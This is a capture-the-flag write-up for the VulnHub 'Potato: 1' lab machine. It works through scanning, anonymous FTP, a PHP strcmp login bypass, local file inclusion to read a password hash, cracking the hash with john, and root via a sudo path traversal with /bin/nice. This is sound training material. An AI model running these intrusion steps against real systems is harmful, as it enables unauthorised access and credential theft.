---
title: Potato:1 - Writeup
author: Elman Alizadeh
date: 2022-06-05 21:50:00 +0800
categories: [ctf, VulnHub]
tags: [vulnhub, potato]
---

Today we will take a look at Vulnhub: Potato: 1. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/vuln-potato/1.png" | relative_url }})

## Nmap

```console
$ sudo nmap -p- -sCV --open 192.168.149.101

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ef:24:0e:ab:d2:b3:16:b4:4b:2e:27:c0:5f:48:79:8b (RSA)
|   256 f2:d8:35:3f:49:59:85:85:07:e6:a2:0e:65:7a:8c:4b (ECDSA)
|_  256 0b:23:89:c3:c0:26:d5:64:5e:93:b7:ba:f5:14:7f:3e (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Potato company
|_http-server-header: Apache/2.4.41 (Ubuntu)
2112/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Gobuster

```console
$ gobuster dir -u http://192.168.149.101 -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.149.101
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/05 20:24:08 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 318] 
/potato               (Status: 301) [Size: 319] 
```

## Ftp

```console
$ ftp 192.168.149.101 2112    

Connected to 192.168.149.101.
220 ProFTPD Server (Debian) [::ffff:192.168.149.101]
Name (192.168.149.101:al1z4deh): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230-Welcome, archive user anonymous@192.168.49.149 !
230-
230-The local time is: Sun Jun 05 16:52:39 2022
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Aug  2  2020 .
drwxr-xr-x   2 ftp      ftp          4096 Aug  2  2020 ..
-rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
226 Transfer complete
ftp> mget *
mget welcome.msg? y
200 PORT command successful
150 Opening BINARY mode data connection for welcome.msg (54 bytes)
226 Transfer complete
54 bytes received in 0.00 secs (155.5586 kB/s)
mget index.php.bak? y
200 PORT command successful
150 Opening BINARY mode data connection for index.php.bak (901 bytes)
226 Transfer complete
901 bytes received in 0.00 secs (1012.5234 kB/s)
ftp> bye
221 Goodbye.
```

## Web

When we look at the website, we see a simple login page. We took its back codes from ftp. Now let’s analyze them.

```console
$ cat index.php.bak

if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
```

We see that we can bypass this line by searching.

[strcmp_bypass](https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016)

![Desktop View]({{ "/assets/img/vuln-potato/2.png" | relative_url }})

And here we login.

## LFI

Once logged in, dashboard.php has a logs section. After selecting a file, click the get the log button.

When we catch the request with burp, we see the file parameter. I used it as lfi.

![Desktop View]({{ "/assets/img/vuln-potato/3.png" | relative_url }})

We got the result. When we look at the results, we see the password of the webadmin user in hash format. Crack it.

```console
$ nano hash

$ john hash --wordlist=/usr/share/wordlists/rockyou.txt

Created directory: /home/al1z4deh/.john
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragon           (webadmin)     
1g 0:00:00:00 DONE (2022-06-05 20:58) 2.702g/s 518.9p/s 518.9c/s 518.9C/s 123456..november
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## Ssh

Let’s enter with ssh.

```console
$ ssh webadmin@192.168.149.101
```

## Root

```console
$ sudo -l

(ALL : ALL) /bin/nice /notes/*
```

In /notes folder we have two scripts which will run as root if we use sudo.

Let’s write a script that we will use.

```console
webadmin@serv:~$ echo "/bin/bash" >> root.sh

webadmin@serv:~$ sudo /bin/nice /notes/../home/webadmin/root.sh
```

![Desktop View]({{ "/assets/img/vuln-potato/4.png" | relative_url }})

### And now we are the root

![Desktop View]({{ "/assets/img/vuln-potato/5.gif" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”
